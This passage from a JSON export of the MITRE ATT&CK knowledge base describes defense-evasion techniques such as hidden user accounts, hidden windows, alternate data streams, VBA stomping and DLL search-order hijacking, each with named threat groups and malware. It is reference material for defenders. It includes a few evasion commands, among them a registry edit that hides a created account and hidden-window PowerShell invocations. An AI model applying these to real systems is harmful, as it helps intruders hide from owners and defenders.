plist file. Every user has a userID associated with it. When the Hide500Users key value is set to TRUE, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the dscl utility to create hidden user accounts by setting the IsHidden attribute to 1. Adversaries can also hide a user\u2019s home folder by changing the chflags to hidden.\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the gsettings command (ex: sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true). Display Managers are not anchored to specific distributions and may be changed by a user or adversary.", "id": "T1564.002", "examples": [{"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has modified the Registry to hide created user accounts."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has run reg add \u2018HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\u2019 /v to hide a newly created user."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has modified the Registry to hide created user accounts from the Windows logon screen. "}]}, {"name": "Hidden Window", "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.", "detailed_description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden.\nIn addition, Windows supports the CreateDesktop() API that can create a hidden desktop window with its own corresponding explorer.exe process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.", "id": "T1564.003", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has used ProcessWindowStyle.Hidden to hide windows."}, {"id": "G0073", "name": "APT19", "description": "APT19 used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. "}, {"id": "G0007", "name": "APT28", "description": "APT28 has used the WindowStyle parameter to conceal PowerShell windows. "}, {"id": "G0022", "name": "APT3", "description": "APT3 has been known to use -WindowStyle Hidden to conceal PowerShell windows."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used the WindowStyle parameter to conceal PowerShell windows.  "}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth loads its module with the XSL script parameter vShow set to zero, which opens the application with a hidden window. "}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can hide the execution of scheduled tasks using ProcessWindowStyle.Hidden."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has hidden its console window by using the ShowWindow API function."}, {"id": "S0360", "name": "BONDUPDATER", "description": "BONDUPDATER uses -windowstyle hidden to conceal a PowerShell window that downloads a payload."}, {"id": "G0052", "name": "CopyKittens", "description": "CopyKittens has used -w hidden and -windowstyle hidden to conceal PowerShell windows. "}, {"id": "S0625", "name": "Cuba", "description": "Cuba has executed hidden PowerShell windows."}, {"id": "G0079", "name": "DarkHydrus", "description": "DarkHydrus has used -WindowStyle Hidden to conceal PowerShell windows. "}, {"id": "G0009", "name": "Deep Panda", "description": "Deep Panda has used -w hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. "}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has used hidcon to run batch files in a hidden console window."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group has used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden. "}, {"id": "S0037", "name": "HAMMERTOSS", "description": "HAMMERTOSS has used -WindowStyle hidden to conceal PowerShell windows."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used a payload that creates a hidden window."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to hide the window for operations performed on a given file."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader hides the Windows Console window created by its execution by directly importing the kernel32.dll and user32.dll libraries GetConsoleWindow and ShowWindow APIs."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has executed legitimate tools in hidden windows."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can hide the current window from the targeted user via the ShowWindow API function."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy uses -w Hidden to conceal a PowerShell window that downloads a payload. "}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used an information gathering module that will hide an AV software window from the victim."}, {"id": "S0437", "name": "Kivars", "description": "Kivars has the ability to conceal its activity through hiding active windows."}, {"id": "S0250", "name": "Koadic", "description": "Koadic has used the command Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden to hide its window."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has used -WindowsStyle Hidden to hide the command window."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window."}, {"id": "S0500", "name": "MCMD", "description": "MCMD can modify processes to prevent them from being visible on the desktop."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has hidden its GUI using the ShowWindow() WINAPI call."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can hide its console window upon execution to decrease its visibility to a victim."}, {"id": "G0133", "name": "Nomadic Octopus", "description": "Nomadic Octopus executed PowerShell in a hidden window."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has added a registry key so future powershell.exe instances are spawned with coordinates for a window position off-screen by default."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can hide process windows and make web requests invisible to the compromised user. Requests marked as invisible have been sent with user-agent string Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A though QuasarRAT can only be run on Windows systems."}, {"id": "S1076", "name": "QUIETCANARY", "description": "QUIETCANARY can execute processes in a hidden window."}, {"id": "S0686", "name": "QuietSieve", "description": "QuietSieve has the ability to execute payloads in a hidden window."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco can hide windows using ProcessWindowStyle.Hidden."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY has the ability to set its window state to hidden."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can execute PowerShell scripts in a hidden window."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has the ability to hide the console window for its document search module from the user."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has hidden malicious scripts using powershell.exe -windowstyle hidden. "}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has used a hidden VNC (hVNC) window to monitor the victim and collect information stealthily."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif droppers have used COM properties to execute malware in hidden windows."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has the ability of performing remote desktop access via a hVNC window for decreased visibility."}, {"id": "S0466", "name": "WindTail", "description": "WindTail can instruct the OS to execute an application without a dock icon or menu."}]}, {"name": "NTFS File Attributes", "description": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).    ", "detailed_description": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).    \nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.", "id": "T1564.004", "examples": [{"id": "S0504", "name": "Anchor", "description": "Anchor has used NTFS to hide files."}, {"id": "G0050", "name": "APT32", "description": "APT32 used NTFS alternate data streams to hide their payloads."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth can abuse alternate data streams (ADS) to store content for malicious payloads."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer has copied itself to the :bin alternate data stream of a newly created file."}, {"id": "S1052", "name": "DEADEYE", "description": "The DEADEYE.EMBED variant of DEADEYE can embed its payload in an alternate data stream of a local file."}, {"id": "S0404", "name": "esentutl", "description": "esentutl can be used to read and write alternate data streams."}, {"id": "S0361", "name": "Expand", "description": "Expand can be used to download or copy a file into an alternate data stream."}, {"id": "S0168", "name": "Gazer", "description": "Gazer stores configuration items in alternate data streams (ADSs) if the Registry is not accessible."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can delete itself while its process is still running through the use of an alternate data stream."}, {"id": "S0397", "name": "LoJax", "description": "LoJax has loaded an embedded NTFS DXE driver to be able to access and write to NTFS partitions."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke hides many of its backdoor payloads in an alternate data stream (ADS)."}, {"id": "S0145", "name": "POWERSOURCE", "description": "If the victim is using PowerShell 3.0 or later, POWERSOURCE writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in %PROGRAMDATA%\\Windows\\."}, {"id": "S0019", "name": "Regin", "description": "The Regin malware platform uses Extended Attributes to store encrypted executables."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability save and execute files as alternate data streams (ADS)."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker has the ability to save and execute files as an alternate data stream (ADS)."}, {"id": "S0027", "name": "Zeroaccess", "description": "Some variants of the Zeroaccess Trojan have been known to store data in Extended Attributes."}]}, {"name": "Hidden File System", "description": "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.", "detailed_description": "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions. Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system. Adversaries may also fragment files across the existing file system structure in non-standard ways.", "id": "T1564.005", "examples": [{"id": "S0114", "name": "BOOTRASH", "description": "BOOTRASH has used unallocated disk space between partitions for a hidden file system that stores components of the Nemesis bootkit."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has used a portable FAT16 partition image placed in %TEMP% as a hidden file system."}, {"id": "G0020", "name": "Equation", "description": "Equation has used an encrypted virtual file system stored in the Windows Registry."}, {"id": "S0019", "name": "Regin", "description": "Regin has used a hidden file system to store some of its components."}, {"id": "G0041", "name": "Strider", "description": "Strider has used a hidden file system that is stored as a file on disk."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use concealed storage mechanisms including an NTFS or FAT-16 filesystem encrypted with CAST-128 in CBC mode."}]}, {"name": "Run Virtual Instance", "description": "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.", "detailed_description": "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.", "id": "T1564.006", "examples": [{"id": "S0451", "name": "LoudMiner", "description": "LoudMiner has used QEMU and VirtualBox to run a Tiny Core Linux virtual machine, which runs XMRig and makes connections to the C2 server for updates."}, {"id": "S0449", "name": "Maze", "description": "Maze operators have used VirtualBox and a Windows 7 virtual machine to run the ransomware; the virtual machine's configuration file mapped the shared network drives of the target company, presumably so Maze can encrypt files on the shared drives as well as the local machine."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker has used VirtualBox and a stripped Windows XP virtual machine to run itself. The use of a shared folder specified in the configuration enables Ragnar Locker to encrypt files on the host operating system, including files on any mapped drives."}]}, {"name": "VBA Stomping", "description": "Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.", "detailed_description": "Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a PerformanceCache that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the _VBA_PROJECT stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero\u2019s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the _VBA_PROJECT stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.", "id": "T1564.007", "examples": []}, {"name": "Email Hiding Rules", "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the New-InboxRule or Set-InboxRule PowerShell cmdlets on Windows systems.", "detailed_description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the New-InboxRule or Set-InboxRule PowerShell cmdlets on Windows systems.\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account.\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as malware, suspicious, phish, and hack) found in message bodies and subject lines.\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).", "id": "T1564.008", "examples": [{"id": "G0085", "name": "FIN4", "description": "FIN4 has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as \"hacked,\" \"phish,\" and \"malware\" in a likely attempt to prevent organizations from communicating about their activities."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider creates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products."}]}, {"name": "Resource Forking", "description": "Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code. Usage of a resource fork is identifiable when displaying a file\u2019s extended attributes, using ls -l@ or xattr -l commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the /Resources folder.", "detailed_description": "Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code. Usage of a resource fork is identifiable when displaying a file\u2019s extended attributes, using ls -l@ or xattr -l commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the /Resources folder.\nAdversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.", "id": "T1564.009", "examples": [{"id": "S0276", "name": "Keydnap", "description": "Keydnap uses a resource fork to present a macOS JPEG or text file icon rather than the executable's icon assigned by the operating system."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer has used a resource fork to hide a compressed binary file of itself from the terminal, Finder, and potentially evade traditional scanners."}]}, {"name": "Process Argument Spoofing", "description": "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.", "detailed_description": "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.\nAdversaries may manipulate a process PEB to evade defenses. For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API WriteProcessMemory() function) then resume process execution with malicious arguments.\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.\nThis behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.", "id": "T1564.010", "examples": [{"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use spoof arguments in spawned processes that execute beacon commands."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT has the ability to modify its process memory to hide process command-line arguments."}]}, {"name": "Ignore Process Interrupts", "description": "Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes.", "detailed_description": "Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes.\nAdversaries may invoke processes using nohup, PowerShell -ErrorAction SilentlyContinue, or similar commands that may be immune to hangups. This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.\nHiding from process interrupt signals may allow malware to continue execution, but unlike Trap this does not establish Persistence since the process will not be re-invoked once actually terminated.", "id": "T1564.011", "examples": [{"id": "S1161", "name": "BPFDoor", "description": "BPFDoor set's it's process to ignore the following signals; SIGHUP, SIGINT, SIGQUIT, SIGPIPE, SIGCHLD, SIGTTIN, and SIGTTOU."}, {"id": "S0588", "name": "GoldMax", "description": "The GoldMax Linux variant has been executed with the nohup command to ignore hangup signals and continue to run if the terminal session was terminated."}, {"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer has used the nohup command to instruct executed payloads to ignore hangup signals."}]}, {"name": "File/Path Exclusions", "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.", "detailed_description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., Disable or Modify Tools), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use Security Software Discovery and other Discovery/Reconnaissance activities to both discover and verify existing exclusions in a victim environment.", "id": "T1564.012", "examples": [{"id": "G0010", "name": "Turla", "description": "Turla has placed LunarWeb install files into directories that are excluded from scanning."}]}]}, {"name": "Hijack Execution Flow", "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.", "id": "T1574", "examples": [{"id": "C0017", "name": "C0017", "description": "During C0017, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER will remove and write malicious shared objects associated with legitimate system functions such as read(2)."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate edits the Registry key HKCU\\Software\\Classes\\mscfile\\shell\\open\\command to execute a malicious AutoIt script. When eventvwr.exe is executed, this will call the Microsoft Management Console (mmc.exe), which in turn references the modified Registry key."}, {"id": "S0354", "name": "Denis", "description": "Denis replaces the nonexistent Windows DLL \"msfte.dll\" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe."}, {"id": "S0567", "name": "Dtrack", "description": "One of Dtrack can replace the normal flow of a program execution with malicious code."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor uses a legitimate executable to load a malicious DLL file for installation."}, {"id": "C0036", "name": "Pikabot Distribution February 2024", "description": "Pikabot Distribution February 2024 utilized a tampered legitimate executable, grepWinNP3.exe, for its first stage Pikabot loader, modifying the open-source tool to execute malicious code when launched."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will drop a copy of itself to a subfolder in %Program Data% or %Program Data%\\Microsoft\\ to attempt privilege elevation and defense evasion if not running in Session 0."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot will use the malicious file slideshow.mp4 if present to load the core API provided by ntdll.dll to avoid any hooks placed on calls to the original ntdll.dll file by endpoint detection and response or antimalware software."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls."}], "sub_techniques": [{"name": "DLL Search Order Hijacking", "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.", "id": "T1574.001", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 has used search order hijacking to execute malicious payloads, such as Winnti for Windows."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has used DLL search-order hijacking to load exe, dll, and dat files into memory. Aquatic Panda loaded a malicious DLL into the legitimate Windows Security Health Service executable (SecurityHealthService.exe) to execute malicious code on victim systems."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth can launch itself via DLL Search Order Hijacking."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has executed DLL search order hijacking."}, {"id": "S0415", "name": "BOOSTWRITE", "description": "BOOSTWRITE has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used search order hijacking to load a malicious DLL."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used search order hijacking to launch Cobalt Strike Beacons."}, {"id": "S0538", "name": "Crutch", "description": "Crutch can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive."}, {"id": "S0134", "name": "Downdelph", "description": "Downdelph uses search order hijacking of the Windows executable sysprep.exe to escalate privileges."}, {"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit various DLL hijacking opportunities."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder."}, {"id": "S0182", "name": "FinFisher", "description": "A FinFisher variant uses DLL search order hijacking."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb's loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate version.dll during the Microsoft.IdentityServer.ServiceHost.exe execution process."}, {"id": "S0009", "name": "Hikit", "description": "Hikit has used DLL Search Order Hijacking to load oci.dll as a persistence mechanism."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll."}, {"id": "S1097", "name": "HUI Loader", "description": "HUI Loader can be deployed to targeted systems via legitimate programs that are vulnerable to DLL search order hijacking."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz can use DLL hijacking to bypass security controls."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used DLL search order hijacking."}, {"id": "S0280", "name": "MirageFox", "description": "MirageFox is likely loaded via DLL hijacking into a legitimate McAfee binary."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has the ability to use DLL search order hijacking for installation on targeted systems."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can hijack outdated Windows application dependencies with malicious versions of its own DLL payload."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves is launched through use of DLL search order hijacking to load a malicious dll."}, {"id": "G0048", "name": "RTM", "description": "RTM has used search order hijacking to force TeamViewer to load a malicious DLL."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has performed DLL search order hijacking to execute their payload."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team abuses a legitimate and signed Microsoft executable to launch a malicious DLL."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker has performed DLL hijacking before execution."}, {"id": "S0109", "name": "WEBC2", "description": "Variants of 